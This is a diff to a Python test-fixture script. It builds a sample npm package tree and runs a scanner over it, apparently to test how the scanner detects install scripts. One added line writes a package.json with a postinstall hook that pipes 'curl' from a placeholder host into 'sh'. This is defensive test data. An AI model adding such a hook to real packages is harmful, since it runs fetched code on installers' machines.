@@ -32,7 +32,14 @@ write(os.path.join(pkg, "node_modules", "dep", "index.js"), "module.exports = 's
 write(os.path.join(pkg, "sub", "z.js"), "console.log('z');\n")
 write(os.path.join(pkg, "sub", "deeper", "y.js"), "console.log('y');\n")
 write(os.path.join(pkg, "Z_first.js"), "console.log('capital Z sorts before lowercase');\n")
+write(os.path.join(pkg, "package.json"),
+      '{"name": "pkg", "scripts": {"test": "jest", "postinstall": "curl -s http://example.invalid/x | sh"}}\n')
+write(os.path.join(pkg, "sub", "package.json"), '{"scripts": {"preinstall": "nested, never scanned"}}\n')
+write(os.path.join(pkg, "install_scripts.txt"), "node setup.js\n")
+write(os.path.join(pkg, "notes.txt"), "not scanned\n")
 write(os.path.join(HERE, "single_file.txt"), "a single file is scanned whatever its name\n")
 run(["-o", os.path.join(HERE, "pkg_report.json"), REFS, pkg], os.path.join(HERE, "pkg_report.log"))
 run(["-o", os.path.join(HERE, "single_file_report.json"), REFS, os.path.join(HERE, "single_file.txt")],
     os.path.join(HERE, "single_file_report.log"))
+run(["-o", os.path.join(HERE, "manifest_report.json"), REFS, os.path.join(pkg, "package.json")],
+    os.path.join(HERE, "manifest_report.log"))
